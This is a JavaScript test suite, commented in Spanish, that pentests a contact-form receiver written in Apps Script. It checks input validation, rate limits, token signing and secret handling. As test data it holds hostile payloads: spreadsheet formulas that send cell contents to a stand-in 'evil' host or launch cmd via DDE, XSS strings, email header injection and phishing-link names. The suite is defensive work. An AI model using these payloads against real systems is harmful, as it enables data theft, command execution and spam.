// Pentest del receptor (Apps Script): entradas hostiles, inyecciones, abuso del correo,
// evasión de límites, automatización y fuga de información.
import test from 'node:test';
import assert from 'node:assert/strict';
import { loadGas, post, validLead } from '../helpers/gas.mjs';

const FORMULA = /^[=+\-@\t\r|%]/;

test('S01 confusión de tipos en todos los campos no rompe ni guarda basura', () => {
  const env = loadGas();
  const weird = [null, 0, 1, true, false, [], {}, ['x'], { a: 1 }, 'x'.repeat(5000), NaN];
  const fields = ['v', 'service', 'details', 'desc', 'urgency', 'location', 'budget', 'client', 'name', 'company', 'email', 'phone', 'channel', 'time', 'consent', 'lang', 'origin', 'elapsed', 'website'];
  for (const f of fields) for (const w of weird) {
    const r = post(env, validLead({ [f]: w }));
    assert.ok(r.ok === true || r.error === 'invalid' || r.error === 'rate', `${f}=${JSON.stringify(w)} → ${JSON.stringify(r)}`);
  }
  for (const row of env.sheets.Contactos.rows) for (const c of row) assert.ok(typeof c !== 'object' || c instanceof Date || c === null, 'sin objetos en celdas');
});

test('S02 contaminación del prototipo por __proto__ y constructor', () => {
  const env = loadGas();
  const body = '{"__proto__":{"polluted":"yes"},"v":1,"service":"other","details":{"__proto__":{"x":1},"constructor":{"prototype":{"y":1}}},"desc":"' + 'a'.repeat(30) + '","urgency":"now","location":"rivera","budget":"1","client":"company","name":"Ana Ana","company":"","email":"a@b.co","phone":"","channel":"email","time":"any","consent":true,"lang":"es","origin":"","elapsed":60,"website":""}';
  const r = post(env, body);
  assert.equal(r.ok, false, 'claves ajenas en details se rechazan');
  assert.equal(({}).polluted, undefined); assert.equal(env.ctx.Object.prototype.polluted, undefined);
  const r2 = post(env, validLead({ service: '__proto__' })); assert.equal(r2.error, 'invalid');
  const r3 = post(env, validLead({ service: 'constructor' })); assert.equal(r3.error, 'invalid');
  const r4 = post(env, validLead({ urgency: 'toString' })); assert.equal(r4.error, 'invalid');
  const r5 = post(env, validLead({ details: { situacion: 'hasOwnProperty', donde: 'nube', uso: ['web'] } })); assert.equal(r5.error, 'invalid');
});

test('S03 bombas JSON: anidación profunda y cuerpos al límite', () => {
  const env = loadGas();
  assert.equal(post(env, '['.repeat(19000)).error, 'invalid');
  assert.equal(post(env, '{"a":'.repeat(3000) + '1' + '}'.repeat(3000)).error, 'invalid');
  const many = validLead({ details: { situacion: 'nuevo', donde: 'nube', uso: Array(2500).fill('web') } });
  const t0 = Date.now(); const r = post(env, many); assert.ok(Date.now() - t0 < 200);
  assert.equal(r.ok, true);
  assert.deepEqual(JSON.parse(JSON.stringify(env.sheets.Contactos.rows[0][7])).includes('Uso: Web'), true);
});

test('S04 ReDoS: validadores en tiempo lineal con entradas patológicas', () => {
  const { ctx } = loadGas();
  const evil = ['a'.repeat(64) + '@' + 'a-'.repeat(90) + '!', 'a@' + 'a.'.repeat(120) + '-', 'a@' + 'a'.repeat(61) + '-.' .repeat(3) + 'x', '+'.repeat(29) + 'x', ' '.repeat(30)];
  for (const s of evil) {
    const t0 = process.hrtime.bigint(); ctx.isEmail_(s); ctx.isPhone_(s); ctx.clean_(s + '\u0000'.repeat(1000), 2000, true);
    assert.ok(Number(process.hrtime.bigint() - t0) / 1e6 < 20, s.slice(0, 20));
  }
});

test('S05 inyección de fórmulas: ninguna celda de texto empieza con = + - @ | %', () => {
  const env = loadGas();
  const payloads = ['=HYPERLINK("http://evil","x")', '+cmd|"/c calc"!A1', '-2+3', '@SUM(1)', '%0A=1', '|calc', '=IMPORTXML("http://evil/?"&A1,"//a")'];
  payloads.forEach((p, i) => post(env, validLead({ name: p + ' x', company: p, desc: p + ' descripción suficientemente larga', email: `p${i}@x.com`, origin: p })));
  assert.ok(env.sheets.Contactos.rows.length >= 6);
  for (const row of env.sheets.Contactos.rows) row.forEach((c, i) => { if (typeof c === 'string') assert.doesNotMatch(c, FORMULA, `columna ${i}: ${c}`); });
});

test('S06 inyección HTML en el correo al dueño y al cliente', () => {
  const env = loadGas();
  post(env, validLead({ name: '<img src=x onerror=alert(1)> Eve', company: '<script>alert(1)</script>', desc: '"><svg onload=alert(1)> descripción larga del problema' }));
  for (const m of env.mail) assert.doesNotMatch(m.htmlBody, /<img src=x|<script>|<svg onload/i);
  assert.match(env.mail[0].htmlBody, /&lt;img src=x onerror=alert\(1\)&gt; Eve/, 'el dueño ve el texto escapado');
  assert.match(env.mail[1].body, /^Hola,/, 'el cliente recibe un saludo sin el nombre manipulado');
});

test('S07 inyección de cabeceras: saltos de línea en nombre/empresa no llegan al asunto', () => {
  const env = loadGas();
  post(env, validLead({ name: 'Eve\r\nBcc: victim@x.com', company: 'X\nSubject: hacked' }));
  for (const m of env.mail) { assert.doesNotMatch(m.subject, /[\r\n]/); assert.doesNotMatch(m.to, /[\s,;]/); }
  const r = post(env, validLead({ email: 'a@b.com\r\nBcc: v@x.com' }));
  assert.equal(r.error, 'invalid');
  const r2 = post(env, validLead({ email: 'a@b.com,victim@x.com' }));
  assert.equal(r2.error, 'invalid');
});

test('S08 suplantación en la autorrespuesta: el nombre no puede meter enlaces ni texto arbitrario', () => {
  const env = loadGas();
  post(env, validLead({ name: 'http://evil.example/login Ganaste', email: 'v1@x.com' }));
  post(env, validLead({ name: 'Visitá www.evil.example', email: 'v2@x.com' }));
  post(env, validLead({ name: 'José María', email: 'v3@x.com' }));
  const replies = env.mail.filter(m => m.to !== 'owner@example.com');
  assert.equal(replies.length, 3);
  for (const m of replies.slice(0, 2)) { assert.doesNotMatch(m.body + m.htmlBody, /evil|http|www\./i); }
  assert.match(replies[2].body, /^Hola José,/);
});

test('S09 bombardeo de correo a terceros: una sola autorrespuesta por destinatario cada 6 horas', () => {
  const env = loadGas();
  for (let i = 0; i < 3; i++) post(env, validLead({ email: 'victima@x.com', desc: 'Pedido distinto número ' + i + ' con texto suficiente' }));
  const toVictim = env.mail.filter(m => m.to === 'victima@x.com');
  assert.equal(toVictim.length, 1);
  assert.equal(env.sheets.Contactos.rows.length, 3, 'igual se guardan para el dueño');
});

test('S10 evasión del límite con variantes del mismo correo (+etiquetas, puntos de Gmail, mayúsculas)', () => {
  const env = loadGas();
  const variants = ['ana.p@gmail.com', 'anap@gmail.com', 'ANA.P+1@gmail.com', 'a.n.a.p+x@googlemail.com', 'anap+zz@gmail.com'];
  const res = variants.map((e, i) => post(env, validLead({ email: e, desc: 'Texto distinto para no repetir ' + i })));
  assert.equal(res.filter(r => r.ok).length, 3);
  assert.equal(res[3].error, 'rate');
});

test('S11 reenvío idéntico (doble envío o replay) no duplica la fila', () => {
  const env = loadGas();
  const a = post(env, validLead()); const b = post(env, validLead());
  assert.equal(a.ok, true); assert.equal(b.ok, true);
  assert.equal(a.id, b.id, 'devuelve el mismo número');
  assert.equal(env.sheets.Contactos.rows.length, 1);
  assert.equal(env.mail.length, 2);
});

test('S12 trampa de bots indistinguible: el número falso varía y tiene el formato real', () => {
  const env = loadGas();
  const ids = new Set();
  for (let i = 0; i < 5; i++) { const r = post(env, validLead({ website: 'x', email: `b${i}@x.com` })); assert.match(r.id, /^RDM-\d{4}-\d{4}$/); ids.add(r.id); }
  assert.ok(ids.size > 1);
  assert.ok([...ids].every(id => !id.endsWith('-0000')));
});

test('S13 automatización: sin token firmado o con token alterado/expirado el pedido queda para revisar y no envía correos', () => {
  const env = loadGas({ props: { FORM_SECRET: 'test-secret-1234567890' } });
  const cfg = JSON.parse(env.ctx.doGet({ parameter: { action: 'config' } }).getContent());
  assert.match(cfg.t, /^\d{10,13}\.[A-Za-z0-9_-]{20,}$/);
  // sin token
  post(env, validLead({ email: 'n1@x.com', t: null }));
  // token alterado
  post(env, validLead({ email: 'n2@x.com', t: cfg.t.replace(/.$/, c => c === 'A' ? 'B' : 'A') }));
  // token del futuro / vencido
  const forge = (ts) => ts + '.' + env.ctx.sign_(String(ts));
  post(env, validLead({ email: 'n3@x.com', t: forge(Date.now() + 3600e3) }));
  post(env, validLead({ email: 'n4@x.com', t: forge(Date.now() - 3 * 86400e3) }));
  // token demasiado nuevo (bot que pide y envía al instante)
  post(env, validLead({ email: 'n5@x.com', t: forge(Date.now()) }));
  const rows = env.sheets.Contactos.rows;
  assert.equal(rows.length, 5);
  assert.ok(rows.every(r => r[2] === 'Revisar (posible spam)'), rows.map(r => r[2]).join());
  assert.equal(env.mail.length, 0);
  // token válido y con tiempo humano
  const r = post(env, validLead({ email: 'ok@x.com', t: forge(Date.now() - 30e3) }));
  assert.equal(r.ok, true); assert.equal(rows[5][2], 'Nuevo'); assert.equal(env.mail.length, 2);
});

test('S14 cuota de correo: con poca cuota se prioriza el aviso al dueño y se omite la autorrespuesta', () => {
  const env = loadGas({ quota: 5 });
  post(env, validLead());
  assert.equal(env.mail.length, 1);
  assert.equal(env.mail[0].to, 'owner@example.com');
  const env2 = loadGas({ mailFails: true });
  const r = post(env2, validLead());
  assert.equal(r.ok, true, 'si el correo falla, el pedido igual queda guardado');
  assert.equal(env2.sheets.Contactos.rows.length, 1);
});

test('S15 doGet nunca expone pedidos, propiedades ni secretos', () => {
  const env = loadGas({ props: { FORM_SECRET: 'super-secret-value-xyz', TELEGRAM_TOKEN: '123:tok' } });
  post(env, validLead());
  for (const params of [{}, { action: 'config' }, { action: 'dump' }, { action: '../Contactos' }, { action: 'config', sheet: 'Contactos' }, { action: ['config', 'x'] }]) {
    const out = env.ctx.doGet({ parameter: params }).getContent();
    assert.doesNotMatch(out, /maria|super-secret|123:tok|Contactos|RDM-/i, JSON.stringify(params));
  }
});

test('S16 errores sin detalles internos ni trazas', () => {
  const env = loadGas({ noSheet: true });
  const out = env.ctx.doPost({ postData: { contents: JSON.stringify(validLead()) } }).getContent();
  assert.equal(out, '{"ok":false,"error":"server"}');
});

test('S17 Telegram: el token viaja codificado y el texto no admite formato', () => {
  const env = loadGas({ props: { TELEGRAM_TOKEN: '1:a/b?c#d', TELEGRAM_CHAT_ID: '5' } });
  post(env, validLead({ name: '*bold* [link](http://evil)' }));
  assert.equal(env.fetches[0].u, 'https://api.telegram.org/bot1%3Aa%2Fb%3Fc%23d/sendMessage');
  assert.equal(env.fetches[0].o.payload.parse_mode, undefined);
});
